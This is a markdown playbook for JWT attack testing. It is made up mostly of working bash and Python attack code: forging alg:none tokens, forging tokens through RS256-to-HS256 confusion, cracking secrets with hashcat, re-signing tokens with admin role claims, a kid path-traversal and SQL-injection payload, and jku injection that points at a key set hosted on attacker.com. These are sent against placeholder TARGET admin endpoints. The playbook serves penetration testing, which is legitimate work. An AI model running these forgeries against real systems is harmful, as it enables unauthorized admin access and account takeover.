# Playbook: JWT Attack Testing

## Purpose
Detect and exploit JSON Web Token implementation flaws including algorithm
confusion, weak secrets, claim manipulation, and key injection attacks.
Input: JWT token from authentication flow or API.

---

## Step 1 — JWT Structure Analysis

```bash
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U"

# Decode header
echo "$TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null; echo

# Decode payload
echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null; echo

# Check:
#   alg: HS256, RS256, ES256, none?
#   typ: JWT
#   kid: key ID (injection target)
#   jku: JWK Set URL (SSRF target)
#   x5u: X.509 URL (SSRF target)
```

---

## Step 2 — Algorithm None Attack

```bash
# If server doesn't enforce algorithm, set alg to "none"
# Header: {"alg":"none","typ":"JWT"}
# No signature needed

HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_')
PAYLOAD=$(echo -n '{"sub":"admin","role":"admin","iat":1700000000}' | base64 | tr -d '=' | tr '+/' '-_')

# Variations of none
FORGED_TOKENS=(
  "${HEADER}.${PAYLOAD}."
  "${HEADER}.${PAYLOAD}"
)

for token in "${FORGED_TOKENS[@]}"; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer $token" \
    "https://TARGET/api/admin")
  echo "Token: ${token:0:50}... → $CODE"
done

# Also try: None, NONE, nOnE
```

---

## Step 3 — Algorithm Confusion (RS256 to HS256)

```bash
# If server uses RS256, try switching to HS256
# The public key becomes the HMAC secret

# Step 1: Get the server's public key
curl -sk "https://TARGET/.well-known/jwks.json" | python3 -m json.tool
# Or: openssl s_client -connect TARGET:443 2>/dev/null | openssl x509 -pubkey -noout

# Step 2: Create HS256 token signed with the public key
# Using python3
python3 << 'PYEOF'
import jwt
import json

# Public key from server (PEM format)
public_key = open("public_key.pem", "r").read()

# Forge token with HS256 using public key as secret
payload = {"sub": "admin", "role": "admin", "iat": 1700000000}
token = jwt.encode(payload, public_key, algorithm="HS256")
print(f"Forged token: {token}")
PYEOF
```

---

## Step 4 — Weak Secret Bruteforce

```bash
# Using hashcat
# Extract hash: TOKEN is the full JWT
echo "$TOKEN" > jwt.txt
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# Using jwt_tool
python3 jwt_tool.py "$TOKEN" -C -d /usr/share/wordlists/rockyou.txt

# Common weak secrets to try
SECRETS=("secret" "password" "123456" "key" "jwt_secret" "changeme" "test" "admin")
for secret in "${SECRETS[@]}"; do
  python3 -c "
import jwt
try:
    decoded = jwt.decode('$TOKEN', '$secret', algorithms=['HS256'])
    print(f'[FOUND] Secret: $secret')
    print(f'Payload: {decoded}')
except jwt.InvalidSignatureError:
    pass
except Exception as e:
    pass
"
done
```

---

## Step 5 — Claim Manipulation

```bash
# After finding secret or bypassing signature:

# Privilege escalation via role claim
python3 << 'PYEOF'
import jwt

SECRET = "discovered_secret"
ORIGINAL = "ORIGINAL_TOKEN"

# Decode original
payload = jwt.decode(ORIGINAL, SECRET, algorithms=["HS256"])
print(f"Original: {payload}")

# Modify claims
payload["role"] = "admin"
payload["is_admin"] = True
payload["sub"] = "1"  # Admin user ID

# Re-sign
forged = jwt.encode(payload, SECRET, algorithm="HS256")
print(f"Forged: {forged}")
PYEOF

# Test forged token
curl -sk -H "Authorization: Bearer $FORGED_TOKEN" "https://TARGET/api/admin/users"
```

---

## Step 6 — KID (Key ID) Injection

```bash
# kid parameter may be vulnerable to path traversal or SQLi

# Path traversal — point kid to a known file
# Sign with the contents of that file as the secret
python3 << 'PYEOF'
import jwt

# kid points to /dev/null (empty file → empty secret)
headers = {"alg": "HS256", "typ": "JWT", "kid": "/dev/null"}
payload = {"sub": "admin", "role": "admin"}
token = jwt.encode(payload, "", algorithm="HS256", headers=headers)
print(token)

# kid points to predictable file
headers = {"alg": "HS256", "typ": "JWT", "kid": "../../public/css/style.css"}
# Sign with contents of that CSS file
PYEOF

# SQL injection in kid
# kid: "1' UNION SELECT 'attacker_secret' -- "
# Server query: SELECT key FROM keys WHERE kid = '1' UNION SELECT 'attacker_secret' -- '
# Token signed with 'attacker_secret'
```

---

## Step 7 — JKU/X5U Header Injection

```bash
# jku: URL to JWK Set — if not validated, point to attacker server
# x5u: URL to X.509 cert — same attack

# Step 1: Generate attacker keypair
openssl genrsa -out attacker.pem 2048
openssl rsa -in attacker.pem -pubout -out attacker_pub.pem

# Step 2: Create JWK from attacker key and host it
python3 << 'PYEOF'
from jwcrypto import jwk
import json

with open("attacker.pem", "rb") as f:
    key = jwk.JWK.from_pem(f.read())

jwks = {"keys": [json.loads(key.export_public())]}
print(json.dumps(jwks, indent=2))
# Host this at https://attacker.com/.well-known/jwks.json
PYEOF

# Step 3: Create token with jku pointing to attacker
python3 << 'PYEOF'
import jwt

headers = {
    "alg": "RS256",
    "typ": "JWT",
    "jku": "https://attacker.com/.well-known/jwks.json"
}
payload = {"sub": "admin", "role": "admin"}
with open("attacker.pem") as f:
    private_key = f.read()
token = jwt.encode(payload, private_key, algorithm="RS256", headers=headers)
print(token)
PYEOF
```

---

## Step 8 — Token Lifecycle Issues

```bash
# Expired token acceptance
# Use a token with exp in the past
curl -sk -H "Authorization: Bearer $EXPIRED_TOKEN" "https://TARGET/api/user"

# Token reuse after logout
# 1. Login → get token
# 2. Logout
# 3. Use same token → should fail
curl -sk -H "Authorization: Bearer $PRE_LOGOUT_TOKEN" "https://TARGET/api/user"

# Token reuse after password change
# Same test — old token should be invalidated

# Refresh token abuse
# Can refresh token be used as access token?
curl -sk -H "Authorization: Bearer $REFRESH_TOKEN" "https://TARGET/api/user"

# No expiry set
# Decode token — if no exp claim, token never expires
```

---

## Output

```
ENDPOINT      : GET /api/admin/users
TOKEN TYPE    : JWT (HS256)
FINDING       : Weak HMAC secret ("secret123") allows token forgery
STEPS         :
  1. Captured JWT from login response
  2. Cracked HS256 secret with hashcat (secret123)
  3. Forged token with role=admin
  4. Accessed admin API successfully
SEVERITY      : CRITICAL — full account takeover / privilege escalation
IMPACT        : Any user can forge admin tokens and access all data
EVIDENCE      : [original token, cracked secret, forged token, admin response]
```

---

## Tools Reference

```bash
# jwt_tool — Swiss Army knife for JWT
pip install jwt_tool
python3 jwt_tool.py TOKEN -T  # Tamper mode
python3 jwt_tool.py TOKEN -C -d wordlist.txt  # Crack

# jwt.io — online decoder (do NOT paste production tokens)

# hashcat
hashcat -m 16500 jwt.txt wordlist.txt
```
